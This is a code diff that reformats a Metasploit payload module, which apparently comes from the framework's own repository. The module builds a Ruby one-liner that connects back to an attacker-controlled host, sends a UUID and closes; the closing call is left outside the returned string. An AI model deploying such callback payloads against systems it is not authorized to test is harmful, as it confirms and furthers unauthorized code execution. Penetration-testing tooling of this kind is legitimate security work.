@@ -1,6 +1,4 @@
-
 module MetasploitModule
-
   CachedSize = 100
 
   include Msf::Payload::Single
@@ -9,17 +7,20 @@ module MetasploitModule
   include Msf::Payload::Pingback::Options
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name' => 'Ruby Pingback, Reverse TCP',
-      'Description' => 'Connect back to the attacker, sends a UUID, then terminates',
-      'Author' => 'asoto-r7',
-      'License' => MSF_LICENSE,
-      'Platform' => 'ruby',
-      'Arch' => ARCH_RUBY,
-      'Handler' => Msf::Handler::ReverseTcp,
-      'Session' => Msf::Sessions::Pingback,
-      'PayloadType' => 'ruby'
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Ruby Pingback, Reverse TCP',
+        'Description' => 'Connect back to the attacker, sends a UUID, then terminates',
+        'Author' => 'asoto-r7',
+        'License' => MSF_LICENSE,
+        'Platform' => 'ruby',
+        'Arch' => ARCH_RUBY,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Pingback,
+        'PayloadType' => 'ruby'
+      )
+    )
   end
 
   def generate
@@ -32,8 +33,8 @@ module MetasploitModule
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
     return "require'socket';" \
-      "c=TCPSocket.new'#{lhost}',#{datastore['LPORT'].to_i};" \
-      "c.puts'#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.unpack('m0');"
-      "c.close"
+           "c=TCPSocket.new'#{lhost}',#{datastore['LPORT'].to_i};" \
+           "c.puts'#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.unpack('m0');"
+    "c.close"
   end
 end
